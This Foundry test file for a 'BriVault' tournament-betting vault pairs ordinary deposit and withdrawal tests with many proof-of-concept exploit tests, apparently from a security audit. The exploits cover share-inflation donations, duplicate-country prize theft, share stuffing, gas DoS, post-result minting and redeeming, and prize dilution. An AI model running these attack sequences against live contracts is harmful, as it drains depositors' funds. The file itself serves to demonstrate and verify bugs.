// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {BriVault} from "../src/briVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./MockErc20.t.sol";


contract BriVaultTest is Test {
    uint256 public participationFeeBsp;
    uint256 public eventStartDate;
    uint256 public eventEndDate;
    address public participationFeeAddress;
    uint256 public minimumAmount;

    // Vault contract
    BriVault public briVault;
    MockERC20 public mockToken;

    // Users
    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    address user5 = makeAddr("user5");

    string[48] countries = [
        "United States", "Canada", "Mexico", "Argentina", "Brazil", "Ecuador",
        "Uruguay", "Colombia", "Peru", "Chile", "Japan", "South Korea",
        "Australia", "Iran", "Saudi Arabia", "Qatar", "Uzbekistan", "Jordan",
        "France", "Germany", "Spain", "Portugal", "England", "Netherlands",
        "Italy", "Croatia", "Belgium", "Switzerland", "Denmark", "Poland",
        "Serbia", "Sweden", "Austria", "Morocco", "Senegal", "Nigeria",
        "Cameroon", "Egypt", "South Africa", "Ghana", "Algeria", "Tunisia",
        "Ivory Coast", "New Zealand", "Costa Rica", "Panama", "United Arab Emirates", "Iraq"
    ];

    function setUp() public {
        participationFeeBsp = 150; // 1.5%
        eventStartDate = block.timestamp + 2 days;
        eventEndDate = eventStartDate + 31 days;
        participationFeeAddress = makeAddr("participationFeeAddress");
        minimumAmount = 0.0002 ether;

        mockToken = new MockERC20("Mock Token", "MTK");

        mockToken.mint(owner, 20 ether);
        mockToken.mint(user1, 20 ether);
        mockToken.mint(user2, 20 ether);
        mockToken.mint(user3, 20 ether);
        mockToken.mint(user4, 20 ether);
        mockToken.mint(user5, 20 ether);

        vm.startPrank(owner);
        briVault = new BriVault(
            IERC20(address(mockToken)), // replace `address(0)` with actual _asset address
            participationFeeBsp,
            eventStartDate,
            participationFeeAddress,
            minimumAmount,
            eventEndDate
        );

        briVault.approve(address(mockToken), type(uint256).max);

          vm.stopPrank();
    }

    function testSetCountryOnlyOwner() public {
        vm.startPrank(owner);
        briVault.setCountry(countries);
        string memory result = briVault.getCountry(2);
        assertEq(result, "Mexico");
    }

    function testOwnerIsSetCorrectly() public view {
    assertEq(briVault.owner(), owner, "Owner should be deployer");
    }

    function testNotOwnerCannotSetCountry() public {
        vm.prank(user1);
        vm.expectRevert();
        briVault.setCountry(countries);
    }

    function testSetWinner() public {
        vm.startPrank(owner);
        briVault.setCountry(countries);
        vm.warp(eventEndDate + 1);
        string memory winner = briVault.setWinner(2);
        console.log(winner);
        string memory result = briVault.getWinner();
        console.log(result);
        assertEq(result, "Mexico");
    }

    function test_deposit() public {
        vm.startPrank(user1);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, user1);
        vm.stopPrank();

        vm.startPrank(user2);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, user2);
        vm.stopPrank();

        vm.startPrank(user3);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, user3);
        vm.stopPrank();

        vm.startPrank(user4);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, user4);
        vm.stopPrank();

        assertEq(mockToken.balanceOf(address(briVault)), 19700000000000000000);
    }

    function test_deposit_after_event_start() public {
        vm.warp(eventStartDate + 3);
        vm.startPrank(user1);
        mockToken.approve(address(briVault), 5 ether);
        vm.expectRevert(abi.encodeWithSignature("eventStarted()"));
        briVault.deposit(5 ether, user1);
        vm.stopPrank();
    }

    function test_joinEvent_noDeposit() public {
        vm.startPrank(user5);
        mockToken.approve(address(briVault), 5 ether);
        vm.expectRevert(abi.encodeWithSignature("noDeposit()"));
        briVault.joinEvent(3);
        vm.stopPrank();
    }

    function test_joinEvent_success() public {
        vm.startPrank(user1);
        mockToken.approve(address(briVault), 5 ether);
        uint256 user1shares = briVault.deposit(5 ether, user1);

        briVault.joinEvent(10);
        console.log("user1 shares", user1shares);
        vm.stopPrank();

        vm.startPrank(user2);
        mockToken.approve(address(briVault), 5 ether);
        uint256 user2shares = briVault.deposit(5 ether, user2);

        briVault.joinEvent(20);
        console.log("user2 shares", user2shares);
        vm.stopPrank();

        vm.startPrank(user3);
        mockToken.approve(address(briVault), 5 ether);
         uint256 user3shares = briVault.deposit(5 ether, user3);
      
        briVault.joinEvent(30);
        console.log("user3 shares", user3shares);
        vm.stopPrank();

        vm.startPrank(user4);
        mockToken.approve(address(briVault), 5 ether);
         uint256 user4shares =  briVault.deposit(5 ether, user4);
    
        briVault.joinEvent(40);
        console.log("user4 shares", user4shares);
        vm.stopPrank();
        
        assertEq(briVault.balanceOf(user1), user1shares);
        assertEq(briVault.balanceOf(user2), user2shares);
        assertEq(briVault.balanceOf(user3), user3shares);
        assertEq(briVault.balanceOf(user4), user4shares);
    }

    function test_cancelParticipation () public {

        vm.startPrank(user1);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, user1);
        briVault.cancelParticipation();
        vm.stopPrank();

        assertEq(briVault.stakedAsset(user1), 0 ether);

        assertEq(mockToken.balanceOf(address(participationFeeAddress)), 0.075 ether);
    }

    function test_cancelParticipation_afterEventStart() public {
        vm.startPrank(user1);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, user1);
        vm.warp(eventStartDate + 4);
        vm.expectRevert(abi.encodeWithSignature("eventStarted()"));
        briVault.cancelParticipation();
        vm.stopPrank();
    }

    function test_withdraw() public {
        vm.startPrank(owner);
        briVault.setCountry(countries);
        vm.stopPrank();

        vm.startPrank(user1);
        mockToken.approve(address(briVault), 5 ether);
        uint256 user1Shares =  briVault.deposit(5 ether, user1);
        briVault.joinEvent(10);
        uint256 balanceBeforuser1 = mockToken.balanceOf(user1);
        vm.stopPrank();

        vm.startPrank(user2);
        mockToken.approve(address(briVault), 5 ether);
        uint256 user2Shares = briVault.deposit(5 ether, user2);
        briVault.joinEvent(10);
        uint256 balanceBeforuser2 = mockToken.balanceOf(user2);
        vm.stopPrank();

        vm.startPrank(user3);
        mockToken.approve(address(briVault), 5 ether);
        uint256 user3Shares = briVault.deposit(5 ether, user3);
        briVault.joinEvent(30);
        vm.stopPrank();

        vm.startPrank(user4);
        mockToken.approve(address(briVault), 5 ether);
        uint256 user4Shares = briVault.deposit(5 ether, user4);
        briVault.joinEvent(10);
        uint256 balanceBeforuser4 = mockToken.balanceOf(user4);
        vm.stopPrank();

        console.log( user3Shares);
        console.log( user2Shares);
        console.log( user1Shares);
        console.log( user4Shares);

        vm.warp(eventEndDate + 1);
        vm.startPrank(owner);
        briVault.setWinner(10);
        console.log(briVault.finalizedVaultAsset());
        vm.stopPrank();

        vm.startPrank(user1);
        briVault.withdraw();
        vm.stopPrank();

        vm.startPrank(user2);
        briVault.withdraw();
        vm.stopPrank();

        vm.startPrank(user3);
        vm.expectRevert(abi.encodeWithSignature("didNotWin()"));
        briVault.withdraw();
        vm.stopPrank();

        vm.startPrank(user4);
        briVault.withdraw();
        vm.stopPrank();

     assertEq(mockToken.balanceOf(user1), balanceBeforuser1 + 6566666666666666666);
     assertEq(mockToken.balanceOf(user2), balanceBeforuser2 + 6566666666666666666);
     assertEq(mockToken.balanceOf(user4), balanceBeforuser4 + 6566666666666666666);
       
    }
    
    function test_exploitDonationAttack() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        mockToken.mint(attacker, 600 ether);
        mockToken.mint(victim, 100 ether);

        uint256 attackerFirstDeposit = 0.0003 ether;
        uint256 attackerDonation = 500 ether;
        uint256 victimDeposit = 10 ether;

        vm.prank(owner);
        briVault.setCountry(countries);

        vm.startPrank(attacker);
        mockToken.approve(address(briVault), type(uint256).max);      
        briVault.deposit(attackerFirstDeposit, attacker);
        mockToken.transfer(address(briVault), attackerDonation);
        uint256 attackerSharesBefore = briVault.balanceOf(attacker);
        vm.stopPrank();
     
        vm.startPrank(victim);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(victimDeposit, victim);
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.startPrank(attacker);
        uint256 attackerShares = briVault.balanceOf(attacker);
        uint256 assetsOut = briVault.redeem(attackerShares, attacker, attacker);
        briVault.joinEvent(0);
        vm.stopPrank();

        uint256 victimShares = briVault.balanceOf(victim);
        uint256 totalAssetsInVault = mockToken.balanceOf(address(briVault));

        console.log("victim shares:", victimShares);
        console.log("total assets in vault:", totalAssetsInVault);
        // Not 1:1 share to asset ratio due to attacker's donation
        assert(victimShares != totalAssetsInVault);
    }

    function test_exploitCanWithdrawIfCountriesHasDuplicate() public {

        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        address loser = makeAddr("loser");

        mockToken.mint(attacker, 50 ether);
        mockToken.mint(victim, 50 ether);
        mockToken.mint(loser, 50 ether);

        // New countries with empty strings at index 0 and 47
        string[48] memory newCountries = [
            "", "Canada", "Mexico", "Argentina", "Brazil", "Ecuador",
            "Uruguay", "Colombia", "Peru", "Chile", "Japan", "South Korea",
            "Australia", "Iran", "Saudi Arabia", "Qatar", "Uzbekistan", "Jordan",
            "France", "Germany", "Spain", "Portugal", "England", "Netherlands",
            "Italy", "Croatia", "Belgium", "Switzerland", "Denmark", "Poland",
            "Serbia", "Sweden", "Austria", "Morocco", "Senegal", "Nigeria",
            "Cameroon", "Egypt", "South Africa", "Ghana", "Algeria", "Tunisia",
            "Ivory Coast", "New Zealand", "Costa Rica", "Panama", "United Arab Emirates", ""
        ];

        vm.prank(owner);
        briVault.setCountry(newCountries);

        vm.startPrank(victim);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, victim);
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.startPrank(loser);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, loser);
        briVault.joinEvent(10);
        vm.stopPrank();

        vm.startPrank(attacker);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, attacker);
        briVault.joinEvent(47);
        vm.stopPrank();

        vm.warp(eventEndDate + 1);
        vm.prank(owner);
        briVault.setWinner(0);

        uint256 totalPrize = briVault.finalizedVaultAsset();
        console.log("Total Prize:", totalPrize);

        vm.prank(attacker);
        briVault.withdraw();
        // assert that attacker has withdraw the prize. 
        // totalPrize still includes attaker's deposit.
        assertEq(mockToken.balanceOf(attacker) - 50 ether + 5 ether, totalPrize);
        console.log("attacker prize:", mockToken.balanceOf(attacker) - 50 ether);

        vm.prank(victim);
        // expect EVM insufficient funds revert since attacker has taken victim's prize.
        vm.expectRevert();
        briVault.withdraw();
    }

    function test_exploitShareStuffing() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        address loser = makeAddr("loser");

        mockToken.mint(attacker, 50 ether);
        mockToken.mint(victim, 50 ether);
        mockToken.mint(loser, 50 ether);

        vm.prank(owner);
        briVault.setCountry(countries);

        vm.startPrank(victim);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, victim);
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.startPrank(loser);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, loser);
        briVault.joinEvent(10);
        vm.stopPrank();

        vm.startPrank(attacker);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, attacker);
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.warp(eventEndDate + 1);
        vm.prank(owner);
        briVault.setWinner(0);

        // Now loser transfers shares to attacker
        uint256 loserShares = briVault.balanceOf(loser);
        vm.prank(loser);
        briVault.transfer(attacker, loserShares);

        vm.prank(attacker);
        briVault.withdraw();

        // Before attacker withdraw: vaultAssets = 15 ether, totalwinnerShares = 10 ether (victim + attacker)
        // After loser's transfer: attackerShares = 5 ether + 5 ether = 10 ether
        // After attacker withdraw: vaultAssets = 15 ether - 15 ether = 0 ether
        assertEq(mockToken.balanceOf(address(briVault)), 0);
    }

    function test_exploitJoinEventGasDoS() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        uint256 maxLoop = 100_000;

        mockToken.mint(attacker, 50 ether);
        mockToken.mint(victim, 50 ether);

        vm.prank(owner);
        briVault.setCountry(countries);

        vm.startPrank(attacker);
        mockToken.approve(address(briVault), 1 ether);
        briVault.deposit(1 ether, attacker);
        
        for (uint256 i = 0; i < maxLoop; i++) {
            briVault.joinEvent(0);
        }
        vm.stopPrank();
    }

    function test_exploitNoIncrementStaking() public {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        mockToken.mint(victim, 50 ether);
        mockToken.mint(attacker, 50 ether);

        vm.prank(owner);
        briVault.setCountry(countries);

        vm.startPrank(victim);
        mockToken.approve(address(briVault), type(uint256).max);
        // deposit 10 ether
        briVault.deposit(10 ether, victim);
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.startPrank(attacker);
        mockToken.approve(address(briVault), type(uint256).max);
        // attacker deposits a tiny amount on behalf of victim, locking victim's stake
        briVault.deposit(0.001 ether, victim);
        vm.stopPrank();

        vm.startPrank(victim);
        briVault.cancelParticipation();
        // Victim can only get back less than 0.001 ether due to no increment in staking
        assertGt(40.001 ether, mockToken.balanceOf(victim));
        vm.stopPrank();
    }

    function test_exploitLoserCanRedeemAfterWinnerSet() public {
        address victim = makeAddr("victim");
        address loser1 = makeAddr("loser1");
        address loser2 = makeAddr("loser2");

        mockToken.mint(victim, 50 ether);
        mockToken.mint(loser1, 50 ether);
        mockToken.mint(loser2, 50 ether);

        vm.prank(owner);
        briVault.setCountry(countries);

        vm.startPrank(victim);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(5 ether, victim);
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.startPrank(loser1);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(5 ether, loser1);
        briVault.joinEvent(10);
        vm.stopPrank();

        vm.startPrank(loser2);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(5 ether, loser2);
        briVault.joinEvent(20);
        vm.stopPrank();

        vm.warp(eventEndDate + 1);
        vm.prank(owner);
        briVault.setWinner(0);

        vm.startPrank(loser1);
        uint256 loser1Shares = briVault.balanceOf(loser1);
        uint256 assetsOut = briVault.redeem(loser1Shares, loser1, loser1);
        vm.stopPrank();
        console.log("loser1 redeemed assets:", assetsOut);

        vm.startPrank(loser2);
        uint256 loser2Shares = briVault.balanceOf(loser2);
        uint256 assetsOut2 = briVault.redeem(loser2Shares, loser2, loser2);
        vm.stopPrank(); 
        console.log("loser2 redeemed assets:", assetsOut2);

        console.log("total winner shares:", briVault.totalWinnerShares());
        console.log("total assets in vault:", mockToken.balanceOf(address(briVault)));
        console.log("finalized vault assets:", briVault.finalizedVaultAsset());
        console.log("victim shares:", briVault.balanceOf(victim));

        vm.prank(victim);
        // expect EVM insufficient funds revert since loser1 and loser2 have redeemed.
        // finalizedVaultAssets is still 15 ether, but vault only has 5 ether left.
        vm.expectRevert();
        briVault.withdraw();
    }

    function test_exploitWinnerCanMintAfterWinnerSet() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        address loser = makeAddr("loser");

        mockToken.mint(attacker, 50 ether);
        mockToken.mint(victim, 50 ether);
        mockToken.mint(loser, 50 ether);

        vm.prank(owner);
        briVault.setCountry(countries);

        vm.startPrank(victim);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(5 ether, victim);
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.startPrank(loser);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(10 ether, loser);
        briVault.joinEvent(10);
        vm.stopPrank();

        vm.startPrank(attacker);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(5 ether, attacker);
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.warp(eventEndDate + 1);
        vm.prank(owner);
        briVault.setWinner(0);

        vm.startPrank(attacker);
        uint256 attackerShares = briVault.balanceOf(attacker);
        // attacker can mint new shares after winner is set
        briVault.mint(2 * attackerShares, attacker);
        briVault.withdraw();
        vm.stopPrank();

        // After attacker withdraws, vault has no assets left
        assertEq(mockToken.balanceOf(address(briVault)), 0);

        vm.prank(victim);
        // expect EVM insufficient funds revert since attacker has taken victim's prize.
        vm.expectRevert();
        briVault.withdraw();
    }

    function test_exploitOwnerCanSetCountriesMultipleTimes() public {

        address victim = makeAddr("victim");
        mockToken.mint(victim, 50 ether);

        // New countries with "Hacked Country" at index 0
        string[48] memory newCountries = [
            "Hacked Country", "Canada", "Mexico", "Argentina", "Brazil", "Ecuador",
            "Uruguay", "Colombia", "Peru", "Chile", "Japan", "South Korea",
            "Australia", "Iran", "Saudi Arabia", "Qatar", "Uzbekistan", "Jordan",
            "France", "Germany", "Spain", "Portugal", "England", "Netherlands",
            "Italy", "Croatia", "Belgium", "Switzerland", "Denmark", "Poland",
            "Serbia", "Sweden", "Austria", "Morocco", "Senegal", "Nigeria",
            "Cameroon", "Egypt", "South Africa", "Ghana", "Algeria", "Tunisia",
            "Ivory Coast", "New Zealand", "Costa Rica", "Panama", "United Arab Emirates", "Iraq"
        ];

        vm.prank(owner);
        briVault.setCountry(countries);

        vm.startPrank(victim);
        mockToken.approve(address(briVault), 5 ether);
        briVault.deposit(5 ether, victim);
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.warp(eventEndDate + 1);
        vm.startPrank(owner);
        // set new countries to lock the prize
        briVault.setCountry(newCountries);
        briVault.setWinner(0);
        vm.stopPrank();

        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSignature("didNotWin()"));
        briVault.withdraw();
    }

    function test_exploitCanDepositOnBehalfOfOthers() public {
        address player1 = makeAddr("player1");
        address player2 = makeAddr("player2");

        mockToken.mint(player1, 50 ether);
        mockToken.mint(player2, 50 ether);

        vm.prank(owner);
        briVault.setCountry(countries);

        vm.startPrank(player1);
        mockToken.approve(address(briVault), type(uint256).max);
        // on behalf of player2 but keep all shares to self
        briVault.deposit(5 ether, player2);
        // deposit little for self to join
        briVault.deposit(0.001 ether, player1);
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.startPrank(player2);
        // player2 can join without deposit
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.warp(eventEndDate + 1);
        vm.prank(owner);
        briVault.setWinner(0);

        vm.prank(player2);
        briVault.withdraw();
        // player2 gets 0 prize since all shares are owned by player1
        assertEq(mockToken.balanceOf(player2), 50 ether);
    }

    function test_exploitDiluteWinnerPrize() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        mockToken.mint(attacker, 50000 ether);
        mockToken.mint(victim, 50 ether);

        vm.prank(owner);
        briVault.setCountry(countries);

        vm.startPrank(victim);
        mockToken.approve(address(briVault), type(uint256).max);      
        briVault.deposit(5 ether, victim);
        briVault.joinEvent(0);
        vm.stopPrank();

        vm.startPrank(attacker);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(50000 ether, attacker);
        briVault.joinEvent(0);
        // deposit a huge amount to increase totalWinnerShares, diluting victim's prize
        // cancel without reset to userSharesToCountry
        briVault.cancelParticipation();
        vm.stopPrank();

        vm.warp(eventEndDate + 1);
        vm.prank(owner);
        briVault.setWinner(0);

        vm.prank(victim);
        briVault.withdraw();
        uint256 victimBalance = mockToken.balanceOf(victim);
        // victim gets a much smaller prize due to dilution
        assertEq(victimBalance, 45000492450754924507);
    }

    function test_exploitGriefingDiluteGuaranteed(uint8 winnerIdxRaw) public {
        // Clamp  to 0..47
        uint256 winnerIdx = bound(uint256(winnerIdxRaw), 0, 47);

        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        mockToken.mint(attacker, 50000 ether);
        mockToken.mint(victim, 50 ether);

        vm.prank(owner);
        briVault.setCountry(countries);

        // victim joins the winning country
        vm.startPrank(victim);
        mockToken.approve(address(briVault), type(uint256).max);      
        briVault.deposit(5 ether, victim);
        briVault.joinEvent(winnerIdx);
        vm.stopPrank();

        vm.startPrank(attacker);
        mockToken.approve(address(briVault), type(uint256).max);
        // attacker stakes great amount
        briVault.deposit(50000 ether, attacker);

        // call joinEvent on all countries to grief the contract
        for (uint256 i = 0; i < 48; i++) {
            briVault.joinEvent(i);
        }

        // cancel without reset to userSharesToCountry (expanded totalWinnerShares)
        briVault.cancelParticipation();
        vm.stopPrank();

        vm.warp(eventEndDate + 1);
        vm.prank(owner);
        briVault.setWinner(winnerIdx);

        vm.prank(victim);
        briVault.withdraw();
        uint256 victimBalance = mockToken.balanceOf(victim);
        // victim gets a much smaller prize due to dilution
        assertEq(victimBalance, 45000010260395290843);
    }
}